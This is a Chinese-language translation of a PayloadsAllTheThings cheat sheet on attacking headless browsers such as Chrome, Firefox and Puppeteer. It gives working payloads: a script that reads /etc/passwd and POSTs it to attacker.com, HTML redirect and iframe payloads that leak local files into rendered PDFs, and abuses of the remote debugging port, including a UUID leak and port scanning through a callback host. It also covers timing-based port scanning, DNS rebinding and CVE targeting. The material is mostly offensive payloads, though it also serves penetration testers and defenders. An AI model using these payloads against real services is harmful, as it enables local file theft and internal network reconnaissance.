# Headless Browser - 无头浏览器安全

[SEARCH_KEYWORDS]
漏洞类型: Headless Browser 无头浏览器 Puppeteer Selenium Chrome Firefox
攻击类型: Local File Read SSRF Port Scanning RCE CVE Exploitation
关键词: headless chrome puppeteer selenium webdriver automation screenshot
技术: Remote Debugging Port File Read PDF Rendering DNS Rebinding
端口: 9222 9229 Remote Debugging Port

[CONTENT]

## 无头浏览器概述

无头浏览器是没有图形用户界面的Web浏览器，它像常规浏览器一样解释HTML、CSS和JavaScript，但在后台执行，不显示任何视觉效果。主要用于自动化任务、网页抓取和测试。

## 无头浏览器命令

### Google Chrome

```ps1
google-chrome --headless[=(new|old)] --print-to-pdf https://www.google.com
```

### Mozilla Firefox

```ps1
firefox --screenshot https://www.google.com
```

### Microsoft Edge

```ps1
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --headless --disable-gpu --window-size=1280,720 --screenshot="C:\tmp\screen.png" "https://google.com"
```

## 本地文件读取

### 不安全标志

如果使用`--allow-file-access`选项启动：

```ps1
google-chrome-stable --disable-gpu --headless=new --no-sandbox --no-first-run --disable-web-security -–allow-file-access-from-files --allow-file-access --allow-cross-origin-auth-prompt --user-data-dir
```

利用代码：

```js
<script>
  async function getFlag(){
    response = await fetch("file:///etc/passwd");
    flag = await response.text();
    fetch("https://attacker.com/", { method: "POST", body: flag})
  };
  getFlag();
</script>
```

### PDF渲染攻击

JavaScript重定向：

```html
<html>
    <body>
        <script>window.location="/etc/passwd"</script>
    </body>
</html>
```

Iframe方式：

```html
<html>
    <body>
        <iframe src="/etc/passwd" height="640" width="640"></iframe>
    </body>
</html>
```

## Remote Debugging Port

默认端口**9222**，可通过`--remote-debugging-port=`修改。

**目标**：`google-chrome-stable --headless=new --remote-debugging-port=XXXX ./index.html`

### 利用技术

- 连接浏览器：`chrome://inspect/#devices`
- 恢复会话：使用`--restore-last-session`获取用户标签页
- 泄露UUID：访问`http://127.0.0.1:<port>/json/version`
- 端口扫描：循环打开`http://localhost:<port>/json/new?http://callback.example.com?port=<port>`
- 本地文件读取

### Node Inspector

```ps1
node --inspect app.js # 默认端口9229
node --inspect=4444 app.js
node --inspect=0.0.0.0:4444 app.js
```

## 网络攻击

### 端口扫描（时序攻击）

1. 动态插入指向假设关闭端口的`<img>`标签
2. 测量onerror时间
3. 重复10次获取平均时间
4. 如果`time_to_error(random_port) > time_to_error(closed_port)*1.3`，端口开放

### DNS重绑定

使用singularity框架进行DNS重绑定攻击。

## CVE利用

识别无头浏览器版本后选择针对V8引擎、Blink渲染器等的漏洞：

- Chrome CVE-2025-5419 - V8越界读写
- Firefox CVE-2024-9680 - Use after free

`--no-sandbox`选项禁用沙箱：

```js
const browser = await puppeteer.launch({
    args: ['--no-sandbox']
});
```

## 工具

- WhiteChocolateMacademiaNut - 与Chromium调试端口交互
- singularity - DNS重绑定框架

## 参考文档

原始来源: PayloadsAllTheThings/Headless Browser/README.md